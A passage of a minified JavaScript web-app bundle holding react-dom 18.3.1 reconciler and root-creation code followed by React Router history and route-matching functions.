t=e.memoizedState,i=0;t!==null&&(i=t.retryLane),xh(e,i)}function Nm(e,t){var i=0;switch(e.tag){case 13:var o=e.stateNode,d=e.memoizedState;d!==null&&(i=d.retryLane);break;case 19:o=e.stateNode;break;default:throw Error(n(314))}o!==null&&o.delete(t),xh(e,i)}var gh;gh=function(e,t,i){if(e!==null)if(e.memoizedProps!==t.pendingProps||It.current)Dt=!0;else{if((e.lanes&i)===0&&(t.flags&128)===0)return Dt=!1,hm(e,t,i);Dt=(e.flags&131072)!==0}else Dt=!1,Je&&(t.flags&1048576)!==0&&Yu(t,vi,t.index);switch(t.lanes=0,t.tag){case 2:var o=t.type;Ii(e,t),e=t.pendingProps;var d=wn(t,Nt.current);Sn(t,i),d=jo(null,t,o,e,d,i);var f=ko();return t.flags|=1,typeof d=="object"&&d!==null&&typeof d.render=="function"&&d.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,$t(o)?(f=!0,xi(t)):f=!1,t.memoizedState=d.state!==null&&d.state!==void 0?d.state:null,mo(t),d.updater=Ai,t.stateNode=d,d._reactInternals=t,To(t,o,e,i),t=Oo(null,t,o,!0,f,i)):(t.tag=0,Je&&f&&no(t),Rt(null,t,d,i),t=t.child),t;case 16:o=t.elementType;e:{switch(Ii(e,t),e=t.pendingProps,d=o._init,o=d(o._payload),t.type=o,d=t.tag=Em(o),e=vr(o,e),d){case 0:t=Ao(null,t,o,e,i);break e;case 1:t=Wd(null,t,o,e,i);break e;case 11:t=Ud(null,t,o,e,i);break e;case 14:t=Ld(null,t,o,vr(o.type,e),i);break e}throw Error(n(306,o,""))}return t;case 0:return o=t.type,d=t.pendingProps,d=t.elementType===o?d:vr(o,d),Ao(e,t,o,d,i);case 1:return o=t.type,d=t.pendingProps,d=t.elementType===o?d:vr(o,d),Wd(e,t,o,d,i);case 3:e:{if(qd(t),e===null)throw Error(n(387));o=t.pendingProps,f=t.memoizedState,d=f.element,ad(e,t),Ni(t,o,null,i);var g=t.memoizedState;if(o=g.element,f.isDehydrated)if(f={element:o,isDehydrated:!1,cache:g.cache,pendingSuspenseBoundaries:g.pendingSuspenseBoundaries,transitions:g.transitions},t.updateQueue.baseState=f,t.memoizedState=f,t.flags&256){d=Cn(Error(n(423)),t),t=Vd(e,t,o,i,d);break e}else if(o!==d){d=Cn(Error(n(424)),t),t=Vd(e,t,o,i,d);break e}else for(Gt=gs(t.stateNode.containerInfo.firstChild),Kt=t,Je=!0,yr=null,i=sd(t,null,o,i),t.child=i;i;)i.flags=i.flags&-3|4096,i=i.sibling;else{if(kn(),o===d){t=Xr(e,t,i);break e}Rt(e,t,o,i)}t=t.child}return t;case 5:return od(t),e===null&&lo(t),o=t.type,d=t.pendingProps,f=e!==null?e.memoizedProps:null,g=d.children,Xl(o,d)?g=null:f!==null&&Xl(o,f)&&(t.flags|=32),Bd(e,t),Rt(e,t,g,i),t.child;case 6:return e===null&&lo(t),null;case 13:return Hd(e,t,i);case 4:return xo(t,t.stateNode.containerInfo),o=t.pendingProps,e===null?t.child=_n(t,null,o,i):Rt(e,t,o,i),t.child;case 11:return o=t.type,d=t.pendingProps,d=t.elementType===o?d:vr(o,d),Ud(e,t,o,d,i);case 7:return Rt(e,t,t.pendingProps,i),t.child;case 8:return Rt(e,t,t.pendingProps.children,i),t.child;case 12:return Rt(e,t,t.pendingProps.children,i),t.child;case 10:e:{if(o=t.type._context,d=t.pendingProps,f=t.memoizedProps,g=d.value,qe(ji,o._currentValue),o._currentValue=g,f!==null)if(gr(f.value,g)){if(f.children===d.children&&!It.current){t=Xr(e,t,i);break e}}else for(f=t.child,f!==null&&(f.return=t);f!==null;){var b=f.dependencies;if(b!==null){g=f.child;for(var N=b.firstContext;N!==null;){if(N.context===o){if(f.tag===1){N=Qr(-1,i&-i),N.tag=2;var $=f.updateQueue;if($!==null){$=$.shared;var V=$.pending;V===null?N.next=N:(N.next=V.next,V.next=N),$.pending=N}}f.lanes|=i,N=f.alternate,N!==null&&(N.lanes|=i),fo(f.return,i,t),b.lanes|=i;break}N=N.next}}else if(f.tag===10)g=f.type===t.type?null:f.child;else if(f.tag===18){if(g=f.return,g===null)throw Error(n(341));g.lanes|=i,b=g.alternate,b!==null&&(b.lanes|=i),fo(g,i,t),g=f.sibling}else g=f.child;if(g!==null)g.return=f;else for(g=f;g!==null;){if(g===t){g=null;break}if(f=g.sibling,f!==null){f.return=g.return,g=f;break}g=g.return}f=g}Rt(e,t,d.children,i),t=t.child}return t;case 9:return d=t.type,o=t.pendingProps.children,Sn(t,i),d=ar(d),o=o(d),t.flags|=1,Rt(e,t,o,i),t.child;case 14:return o=t.type,d=vr(o,t.pendingProps),d=vr(o.type,d),Ld(e,t,o,d,i);case 15:return Md(e,t,t.type,t.pendingProps,i);case 17:return o=t.type,d=t.pendingProps,d=t.elementType===o?d:vr(o,d),Ii(e,t),t.tag=1,$t(o)?(e=!0,xi(t)):e=!1,Sn(t,i),Pd(t,o,d),To(t,o,d,i),Oo(null,t,o,!0,e,i);case 19:return Gd(e,t,i);case 22:return Fd(e,t,i)}throw Error(n(156,t.tag))};function yh(e,t){return W(e,t)}function Sm(e,t,i,o){this.tag=e,this.key=i,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=o,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function or(e,t,i,o){return new Sm(e,t,i,o)}function Zo(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Em(e){if(typeof e=="function")return Zo(e)?1:0;if(e!=null){if(e=e.$$typeof,e===Fe)return 11;if(e===ae)return 14}return 2}function Cs(e,t){var i=e.alternate;return i===null?(i=or(e.tag,t,e.key,e.mode),i.elementType=e.elementType,i.type=e.type,i.stateNode=e.stateNode,i.alternate=e,e.alternate=i):(i.pendingProps=t,i.type=e.type,i.flags=0,i.subtreeFlags=0,i.deletions=null),i.flags=e.flags&14680064,i.childLanes=e.childLanes,i.lanes=e.lanes,i.child=e.child,i.memoizedProps=e.memoizedProps,i.memoizedState=e.memoizedState,i.updateQueue=e.updateQueue,t=e.dependencies,i.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},i.sibling=e.sibling,i.index=e.index,i.ref=e.ref,i}function Vi(e,t,i,o,d,f){var g=2;if(o=e,typeof e=="function")Zo(e)&&(g=1);else if(typeof e=="string")g=5;else e:switch(e){case F:return Xs(i.children,d,f,t);case ne:g=8,d|=8;break;case ue:return e=or(12,i,t,d|2),e.elementType=ue,e.lanes=f,e;case Re:return e=or(13,i,t,d),e.elementType=Re,e.lanes=f,e;case de:return e=or(19,i,t,d),e.elementType=de,e.lanes=f,e;case he:return Hi(i,d,f,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Ee:g=10;break e;case ze:g=9;break e;case Fe:g=11;break e;case ae:g=14;break e;case we:g=16,o=null;break e}throw Error(n(130,e==null?e:typeof e,""))}return t=or(g,i,t,d),t.elementType=e,t.type=o,t.lanes=f,t}function Xs(e,t,i,o){return e=or(7,e,o,t),e.lanes=i,e}function Hi(e,t,i,o){return e=or(22,e,o,t),e.elementType=he,e.lanes=i,e.stateNode={isHidden:!1},e}function ec(e,t,i){return e=or(6,e,null,t),e.lanes=i,e}function tc(e,t,i){return t=or(4,e.children!==null?e.children:[],e.key,t),t.lanes=i,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Cm(e,t,i,o,d){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=El(0),this.expirationTimes=El(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=El(0),this.identifierPrefix=o,this.onRecoverableError=d,this.mutableSourceEagerHydrationData=null}function rc(e,t,i,o,d,f,g,b,N){return e=new Cm(e,t,i,b,N),t===1?(t=1,f===!0&&(t|=8)):t=0,f=or(3,null,null,t),e.current=f,f.stateNode=e,f.memoizedState={element:o,isDehydrated:i,cache:null,transitions:null,pendingSuspenseBoundaries:null},mo(f),e}function Tm(e,t,i){var o=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:J,key:o==null?null:""+o,children:e,containerInfo:t,implementation:i}}function vh(e){if(!e)return vs;e=e._reactInternals;e:{if(qt(e)!==e||e.tag!==1)throw Error(n(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if($t(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(n(171))}if(e.tag===1){var i=e.type;if($t(i))return Ku(e,i,t)}return t}function wh(e,t,i,o,d,f,g,b,N){return e=rc(i,o,!0,e,d,f,g,b,N),e.context=vh(null),i=e.current,o=Pt(),d=Ss(i),f=Qr(o,d),f.callback=t??null,js(i,f,d),e.current.lanes=d,ta(e,d,o),Ut(e,o),e}function Ki(e,t,i,o){var d=t.current,f=Pt(),g=Ss(d);return i=vh(i),t.context===null?t.context=i:t.pendingContext=i,t=Qr(f,g),t.payload={element:e},o=o===void 0?null:o,o!==null&&(t.callback=o),e=js(d,t,g),e!==null&&(jr(e,d,g,f),_i(e,d,g)),g}function Gi(e){return e=e.current,e.child?(e.child.tag===5,e.child.stateNode):null}function bh(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var i=e.retryLane;e.retryLane=i!==0&&i<t?i:t}}function sc(e,t){bh(e,t),(e=e.alternate)&&bh(e,t)}function Rm(){return null}var jh=typeof reportError=="function"?reportError:function(e){console.error(e)};function nc(e){this._internalRoot=e}Ji.prototype.render=nc.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(n(409));Ki(e,t,null,null)},Ji.prototype.unmount=nc.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;Js(function(){Ki(null,e,null,null)}),t[Hr]=null}};function Ji(e){this._internalRoot=e}Ji.prototype.unstable_scheduleHydration=function(e){if(e){var t=au();e={blockedOn:null,target:e,priority:t};for(var i=0;i<ps.length&&t!==0&&t<ps[i].priority;i++);ps.splice(i,0,e),i===0&&ou(e)}};function ac(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Yi(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function kh(){}function Pm(e,t,i,o,d){if(d){if(typeof o=="function"){var f=o;o=function(){var $=Gi(g);f.call($)}}var g=wh(t,o,e,0,null,!1,!1,"",kh);return e._reactRootContainer=g,e[Hr]=g.current,ma(e.nodeType===8?e.parentNode:e),Js(),g}for(;d=e.lastChild;)e.removeChild(d);if(typeof o=="function"){var b=o;o=function(){var $=Gi(N);b.call($)}}var N=rc(e,0,!1,null,null,!1,!1,"",kh);return e._reactRootContainer=N,e[Hr]=N.current,ma(e.nodeType===8?e.parentNode:e),Js(function(){Ki(t,N,i,o)}),N}function Qi(e,t,i,o,d){var f=i._reactRootContainer;if(f){var g=f;if(typeof d=="function"){var b=d;d=function(){var N=Gi(g);b.call(N)}}Ki(t,g,e,d)}else g=Pm(i,t,e,d,o);return Gi(g)}su=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var i=ea(t.pendingLanes);i!==0&&(Cl(t,i|1),Ut(t,Te()),(Ie&6)===0&&(Pn=Te()+500,ws()))}break;case 13:Js(function(){var o=Yr(e,1);if(o!==null){var d=Pt();jr(o,e,1,d)}}),sc(e,1)}},Tl=function(e){if(e.tag===13){var t=Yr(e,134217728);if(t!==null){var i=Pt();jr(t,e,134217728,i)}sc(e,134217728)}},nu=function(e){if(e.tag===13){var t=Ss(e),i=Yr(e,t);if(i!==null){var o=Pt();jr(i,e,t,o)}sc(e,t)}},au=function(){return Me},iu=function(e,t){var i=Me;try{return Me=e,t()}finally{Me=i}},ge=function(e,t,i){switch(t){case"input":if(it(e,i),t=i.name,i.type==="radio"&&t!=null){for(i=e;i.parentNode;)i=i.parentNode;for(i=i.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<i.length;t++){var o=i[t];if(o!==e&&o.form===e.form){var d=pi(o);if(!d)throw Error(n(90));et(o),it(o,d)}}}break;case"textarea":Tr(e,i);break;case"select":t=i.value,t!=null&&_t(e,!!i.multiple,t,!1)}},Ir=Yo,on=Js;var Am={usingClientEntryPoint:!1,Events:[ya,yn,pi,ln,pt,Yo]},Aa={findFiberByHostInstance:Fs,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Om={bundleType:Aa.bundleType,version:Aa.version,rendererPackageName:Aa.rendererPackageName,rendererConfig:Aa.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:H.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=O(e),e===null?null:e.stateNode},findFiberByHostInstance:Aa.findFiberByHostInstance||Rm,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Xi=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Xi.isDisabled&&Xi.supportsFiber)try{Ja=Xi.inject(Om),Dr=Xi}catch{}}return Lt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Am,Lt.createPortal=function(e,t){var i=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!ac(t))throw Error(n(200));return Tm(e,t,null,i)},Lt.createRoot=function(e,t){if(!ac(e))throw Error(n(299));var i=!1,o="",d=jh;return t!=null&&(t.unstable_strictMode===!0&&(i=!0),t.identifierPrefix!==void 0&&(o=t.identifierPrefix),t.onRecoverableError!==void 0&&(d=t.onRecoverableError)),t=rc(e,1,!1,null,null,i,!1,o,d),e[Hr]=t.current,ma(e.nodeType===8?e.parentNode:e),new nc(t)},Lt.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(n(188)):(e=Object.keys(e).join(","),Error(n(268,e)));return e=O(t),e=e===null?null:e.stateNode,e},Lt.flushSync=function(e){return Js(e)},Lt.hydrate=function(e,t,i){if(!Yi(t))throw Error(n(200));return Qi(null,e,t,!0,i)},Lt.hydrateRoot=function(e,t,i){if(!ac(e))throw Error(n(405));var o=i!=null&&i.hydratedSources||null,d=!1,f="",g=jh;if(i!=null&&(i.unstable_strictMode===!0&&(d=!0),i.identifierPrefix!==void 0&&(f=i.identifierPrefix),i.onRecoverableError!==void 0&&(g=i.onRecoverableError)),t=wh(t,null,e,1,i??null,d,!1,f,g),e[Hr]=t.current,ma(e),o)for(e=0;e<o.length;e++)i=o[e],d=i._getVersion,d=d(i._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[i,d]:t.mutableSourceEagerHydrationData.push(i,d);return new Ji(t)},Lt.render=function(e,t,i){if(!Yi(t))throw Error(n(200));return Qi(null,e,t,!1,i)},Lt.unmountComponentAtNode=function(e){if(!Yi(e))throw Error(n(40));return e._reactRootContainer?(Js(function(){Qi(null,null,e,!1,function(){e._reactRootContainer=null,e[Hr]=null})}),!0):!1},Lt.unstable_batchedUpdates=Yo,Lt.unstable_renderSubtreeIntoContainer=function(e,t,i,o){if(!Yi(i))throw Error(n(200));if(e==null||e._reactInternals===void 0)throw Error(n(38));return Qi(e,t,i,!1,o)},Lt.version="18.3.1-next-f1338f8080-20240426",Lt}var Ph;function xf(){if(Ph)return oc.exports;Ph=1;function a(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(a)}catch(r){console.error(r)}}return a(),oc.exports=Bm(),oc.exports}var Ah;function Wm(){if(Ah)return Zi;Ah=1;var a=xf();return Zi.createRoot=a.createRoot,Zi.hydrateRoot=a.hydrateRoot,Zi}var qm=Wm();const Vm=mf(qm);xf();function La(){return La=Object.assign?Object.assign.bind():function(a){for(var r=1;r<arguments.length;r++){var n=arguments[r];for(var l in n)Object.prototype.hasOwnProperty.call(n,l)&&(a[l]=n[l])}return a},La.apply(this,arguments)}var As;(function(a){a.Pop="POP",a.Push="PUSH",a.Replace="REPLACE"})(As||(As={}));const Oh="popstate";function Hm(a){a===void 0&&(a={});function r(l,c){let{pathname:u,search:h,hash:m}=l.location;return bc("",{pathname:u,search:h,hash:m},c.state&&c.state.usr||null,c.state&&c.state.key||"default")}function n(l,c){return typeof c=="string"?c:dl(c)}return Gm(r,n,null,a)}function Ze(a,r){if(a===!1||a===null||typeof a>"u")throw new Error(r)}function Fc(a,r){if(!a){typeof console<"u"&&console.warn(r);try{throw new Error(r)}catch{}}}function Km(){return Math.random().toString(36).substr(2,8)}function Ih(a,r){return{usr:a.state,key:a.key,idx:r}}function bc(a,r,n,l){return n===void 0&&(n=null),La({pathname:typeof a=="string"?a:a.pathname,search:"",hash:""},typeof r=="string"?Kn(r):r,{state:n,key:r&&r.key||l||Km()})}function dl(a){let{pathname:r="/",search:n="",hash:l=""}=a;return n&&n!=="?"&&(r+=n.charAt(0)==="?"?n:"?"+n),l&&l!=="#"&&(r+=l.charAt(0)==="#"?l:"#"+l),r}function Kn(a){let r={};if(a){let n=a.indexOf("#");n>=0&&(r.hash=a.substr(n),a=a.substr(0,n));let l=a.indexOf("?");l>=0&&(r.search=a.substr(l),a=a.substr(0,l)),a&&(r.pathname=a)}return r}function Gm(a,r,n,l){l===void 0&&(l={});let{window:c=document.defaultView,v5Compat:u=!1}=l,h=c.history,m=As.Pop,x=null,y=v();y==null&&(y=0,h.replaceState(La({},h.state,{idx:y}),""));function v(){return(h.state||{idx:null}).idx}function k(){m=As.Pop;let T=v(),D=T==null?null:T-y;y=T,x&&x({action:m,location:E.location,delta:D})}function _(T,D){m=As.Push;let z=bc(E.location,T,D);y=v()+1;let I=Ih(z,y),H=E.createHref(z);try{h.pushState(I,"",H)}catch(te){if(te instanceof DOMException&&te.name==="DataCloneError")throw te;c.location.assign(H)}u&&x&&x({action:m,location:E.location,delta:1})}function S(T,D){m=As.Replace;let z=bc(E.location,T,D);y=v();let I=Ih(z,y),H=E.createHref(z);h.replaceState(I,"",H),u&&x&&x({action:m,location:E.location,delta:0})}function w(T){let D=c.location.origin!=="null"?c.location.origin:c.location.href,z=typeof T=="string"?T:dl(T);return z=z.replace(/ $/,"%20"),Ze(D,"No window.location.(origin|href) available to create URL for href: "+z),new URL(z,D)}let E={get action(){return m},get location(){return a(c,h)},listen(T){if(x)throw new Error("A history only accepts one active listener");return c.addEventListener(Oh,k),x=T,()=>{c.removeEventListener(Oh,k),x=null}},createHref(T){return r(c,T)},createURL:w,encodeLocation(T){let D=w(T);return{pathname:D.pathname,search:D.search,hash:D.hash}},push:_,replace:S,go(T){return h.go(T)}};return E}var $h;(function(a){a.data="data",a.deferred="deferred",a.redirect="redirect",a.error="error"})($h||($h={}));function Jm(a,r,n){return n===void 0&&(n="/"),Ym(a,r,n)}function Ym(a,r,n,l){let c=typeof r=="string"?Kn(r):r,u=qn(c.pathname||"/",n);if(u==null)return null;let h=gf(a);Qm(h);let m=null;for(let x=0;m==null&&x<h.length;++x){let y=o0(u);m=i0(h[x],y)}return m}function gf(a,r,n,l){r===void 0&&(r=[]),n===void 0&&(n=[]),l===void 0&&(l="");let c=(u,h,m)=>{let x={relativePath:m===void 0?u.path||"":m,caseSensitive:u.caseSensitive===!0,childrenIndex:h,route:u};x.relativePath.startsWith("/")&&(Ze(x.relativePath.startsWith(l),'Absolute route path "'+x.relativePath+'" nested under path '+('"'+l+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),x.relativePath=x.relativePath.slice(l.length));let y=Is([l,x.relativePath]),v=n.concat(x);u.children&&u.children.length>0&&(Ze(u.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+y+'".')),gf(u.children,r,v,y)),!(u.path==null&&!u.index)&&r.push({path:y,score:n0(y,u.index),routesMeta:v})};return a.forEach((u,h)=>{var m;if(u.path===""||!((m=u.path)!=null&&m.includes("?")))c(u,h);else for(let x of yf(u.path))c(u,h,x)}),r}function yf(a){let r=a.split("/");if(r.length===0)return[];let[n,...l]=r,c=n.endsWith("?"),u=n.replace(/\?$/,"");if(l.length===0)return c?[u,""]:[u];let h=yf(l.join("/")),m=[];return m.push(...h.map(x=>x===""?u:[u,x].join("/"))),c&&m.push(...h),m.map(x=>a.startsWith("/")&&x===""?"/":x)}function Qm(a){a.sort((r,n)=>r.score!==n.score?n.score-r.score:a0(r.routesMeta.map(l=>l.childrenIndex),n.routesMeta.map(l=>l.childrenIndex)))}const Xm=/^:[\w-]+$/,Zm=3,e0=2,t0=1,r0=10,s0=-2,Dh=a=>a==="*";function n0(a,r){let n=a.split("/"),l=n.length;return n.some(Dh)&&(l+=s0),r&&(l+=e0),n.filter(c=>!Dh(c)).reduce((c,u)=>c+(Xm.test(u)?Zm:u===""?t0:r0),l)}function a0(a,r){return a.length===r.length&&a.slice(0,-1).every((l,c)=>l===r[c])?a[a.length-1]-r[r.length-1]:0}function i0(a,r,n){let{routesMeta:l}=a,c={},u="/",h=[];for(let m=0;m<l.length;++m){let x=l[m],y=m===l.length-1,v=u==="/"?r:r.slice(u.length)||"/",k=jc({path:x.relativePath,caseSensitive:x.caseSensitive,end:y},v),_=x.route;if(!k)return null;Object.assign(c,k.params),h.push({params:c,pathname:Is([u,k.pathname]),pathnameBase:f0(Is([u,k.pathnameBase])),route:_}),k.pathnameBase!=="/"&&(u=Is([u,k.pathnameBase]))}return h}function jc(a,r){typeof a=="string"&&(a={path:a,caseSensitive:!1,end:!0});let[n,l]=l0(a.path,a.caseSensitive,a.end),c=r.match(n);if(!c)return null;let u=c[0],h=u.replace(/(.)\/+$/,"$1"),m=c.slice(1);return{params:l.reduce((y,v,k)=>{let{paramName:_,isOptional:S}=v;if(_==="*"){let E=m[k]||"";h=u.slice(0,u.length-E.length).replace(/(.)\/+$/,"$1")}const w=m[k];return S&&!w?y[_]=void 0:y[_]=(w||"").replace(/%2F/g,"/"),y},{}),pathname:u,pathnameBase:h,pattern:a}}function l0(a,r,n){r===void 0&&(r=!1),n===void 0&&(n=!0),Fc(a==="*"||!a.endsWith("*")||a.endsWith("/*"),'Route path "'+a+'" will be treated as if it were '+('"'+a.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+a.replace(/\*$/,"/*")+'".'));let l=[],c="^"+a.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(h,m,x)=>(l.push({paramName:m,isOptional:x!=null}),x?"/?([^\\/]+)?":"/([^\\/]+)"));return a.endsWith("*")?(l.push({paramName:"*"}),c+=a==="*"||a==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?c+="\\/*$":a!==""&&a!=="/"&&(c+="(?:(?=\\/|$))"),[new RegExp(c,r?void 0:"i"),l]}function o0(a){try{return a.split("/").map(r=>decodeURIComponent(r).replace(/\//g,"%2F")).join("/")}catch(r){return Fc(!1,'The URL path "'+a+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+r+").")),a}}function qn(a,r){if(r==="/")return a;if(!a.toLowerCase().startsWith(r.toLowerCase()))return null;let n=r.endsWith("/")?r.length-1:r.length,l=a.charAt(n);return l&&l!=="/"?null:a.slice(n)||"/"}const c0=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,u0=a=>c0.test(a);function d0(a,r){r===void 0&&(r="/");let{pathname:n,search:l="",hash:c=""}=typeof a=="string"?Kn(a):a,u;if(n)if(u0(n))u=n;else{if(n.includes("//")){let h=n;n=n.replace(/\/\/+/g,"/"),Fc(!1,"Pathnames cannot have embedded double slashes - normalizing "+(h+" -> "+n))}n.startsWith("/")?u=zh(n.substring(1),"/"):u=zh(n,r)}else u=r;return{pathname:u,search:p0(l),hash:m0(c)}}function zh(a,r){let n=r.replace(/\/+$/,"").split("/");return a.split("/").forEach(c=>{c===".."?n.length>1&&n.pop():c!=="."&&n.push(c)}),n.length>1?n.join("/"):"/"}function dc(a,r,n,l){return"Cannot include a '"+a+"' character in a manually specified "+("`to."+r+"` field ["+JSON.stringify(l)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function h0(a){return a.filter((r,n)=>n===0||r.route.path&&r.route.path.length>0)}function Bc(a,r){let n=h0(a);return r?n.map((l,c)=>c===n.length-1?l.pathname:l.pathnameBase):n.map(l=>l.pathnameBase)}function Wc(a,r,n,l){l===void 0&&(l=!1);let c;typeof a=="string"?c=Kn(a):(c=La({},a),Ze(!c.pathname||!c.pathname.includes("?"),dc("?","pathname","search",c)),Ze(!c.pathname||!c.pathname.includes("#"),dc("#","pathname","hash",c)),Ze(!c.search||!c.search.includes("#"),dc("#","search","hash",c)));let u=a===""||c.pathname==="",h=u?"/":c.pathname,m;if(h==null)m=n;else{let k=r.length-1;if(!l&&h.startsWith("..")){let _=h.split("/");for(;_[0]==="..";)_.shift(),k-=1;c.pathname=_.join("/")}m=k>=0?r[k]:"/"}let x=d0(c,m),y=h&&h!=="/"&&h.endsWith("/"),v=(u||h===".")&&n.endsWith("/");return!x.pathname.endsWith("/")&&(y||v)&&(x.pathname+="/"),x}const Is=a=>a.join("/").replace(/\/\/+/g,"/"),f0=a=>a.replace(/\/+$/,"").replace(/^\/*/,"/"),p0=a=>!a||a==="?"?"":a.startsWith("?")?a:"?"+a,m0=a=>!a||a==="#"?"":a.startsWith("#")?a:"#"+a;function x0(a){return a!=null&&typeof a.status=="number"&&typeof a.statusText=="string"&&typeof a.internal=="boolean"&&"data"in a}const vf=["post","put","patch","delete"];new Set(vf);const g0=["get",...vf];new Set(g0);function Ma(){return Ma=Object.assign?Object.assign.bind():function(a){for(var r=1;r<arguments.length;r++){var n=arguments[r];for(var l in n)Object.prototype.hasOwnProperty.call(n,l)&&(a[l]=n[l])}return a},Ma.apply(this,arguments)}const vl=j.createContext(null),wf=j.createContext(null),as=j.createContext(null),wl=j.createContext(null),is=j.createContext({outlet:null,matches:[],isDataRoute:!1}),bf=j.createContext(null);function y0(a,r){let{relative:n}=r===void 0?{}:r;Gn()||Ze(!1);let{basename:l,navigator:c}=j.useContext(as),{hash:u,pathname:h,search:m}=bl(a,{relative:n}),x=h;return l!=="/"&&(x=h==="/"?l:Is([l,h])),c.createHref({pathname:x,search:m,hash:u})}function Gn(){return j.useContext(wl)!=null}function an(){return Gn()||Ze(!1),j.useContext(wl).location}function jf(a){j.useContext(as).static||j.useLayoutEffect(a)}function ur(){let{isDataRoute:a}=j.useContext(is);return a?A0():v0()}function v0(){Gn()||Ze(!1);let a=j.useContext(vl),{basename:r,future:n,navigator:l}=j.useContext(as),{matches:c}=j.useContext(is),{pathname:u}=an(),h=JSON.stringify(Bc(c,n.v7_relativeSplatPath)),m=j.useRef(!1);return jf(()=>{m.current=!0}),j.useCallback(function(y,v){if(v===void 0&&(v={}),!m.current)return;if(typeof y=="number"){l.go(y);return}let k=Wc(y,JSON.parse(h),u,v.relative==="path");a==null&&r!=="/"&&(k.pathname=k.pathname==="/"?r:Is([r,k.pathname])),(v.replace?l.replace:l.push)(k,v.state,v)},[r,l,h,u,a])}function w0(){let{matches:a}=j.useContext(is),r=a[a.length-1];return r?r.params:{}}function bl(a,r){let{relative:n}=r===void 0?{}:r,{future:l}=j.useContext(as),{matches:c}=j.useContext(is),{pathname:u}=an(),h=JSON.stringify(Bc(c,l.v7_relativeSplatPath));return j.useMemo(()=>Wc(a,JSON.parse(h),u,n==="path"),[a,h,u,n])}function b0(a,r){return j0(a,r)}function j0(a,r,n,l){Gn()||Ze(!1);let{navigator:c}=j.useContext(as),{matches:u}=j.useContext(is),h=u[u.length-1],m=h?h.params:{};h&&h.pathname;let x=h?h.pathnameBase:"/";h&&h.route;let y=an(),v;if(r){var k;let T=typeof r=="string"?Kn(r):r;x==="/"||(k=T.pathname)!=null&&k.startsWith(x)||Ze(!1),v=T}else v=y;let _=v.pathname||"/",S=_;if(x!=="/"){let T=x.replace(/^\//,"").split("/");S="/"+_.replace(/^\//,"").split("/").slice(T.length).join("/")}let w=Jm(a,{pathname:S}),E=E0(w&&w.map(T=>Object.assign({},T,{params:Object.assign({},m,T.params),pathname:Is([x,c.encodeLocation?c.encodeLocation(T.pathname).pathname:T.pathname]),pathnameBase:T.pathnameBase==="/"?x:Is([x,c.encodeLocation?c.encodeLocation(T.pathnameBase).pathname:T.pathnameBase])})),u,n,l);return r&&E?j.createElement(wl.Provider,{value:{location:Ma({pathname:"/",search:"",hash:"",state:null,key:"default"},v),navigationType:As.Pop}},E):E}function k0(){let a=P0(),r=x0(a)?a.status+" "+a.statusText:a instanceof Error?a.message:JSON.stringify(a),n=a instanceof Error?a.stack:null,c={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return 